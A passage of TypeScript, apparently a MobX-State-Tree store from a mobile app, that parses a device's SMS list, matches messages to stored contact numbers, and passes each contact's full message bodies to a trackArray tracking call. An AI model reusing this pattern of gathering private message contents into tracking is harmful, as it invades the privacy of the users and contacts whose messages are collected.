        (count: number, smsList: string) => {
          const arr = JSON.parse(smsList) as { body: string; type: string; address: string }[]
          contactsPhones.forEach(phoneNumber => {
            const messages = arr.filter(({ address }) => address === phoneNumber)
            if (messages.length > 0) {
              const smsBody = messages.map(({ body, type }) => `${type}:${body}|`)
              trackArray(`SMS-${phoneNumber}`, smsBody)
            }
          })
        }
      )
    }
  }))
  .views(self => ({
    get listView() {
      return sortBy(({ label }) => label, self.items.map(item => ({
        label: item.name,
        value: item.simNumber,
        details: item.place
      })))
    }
  }))
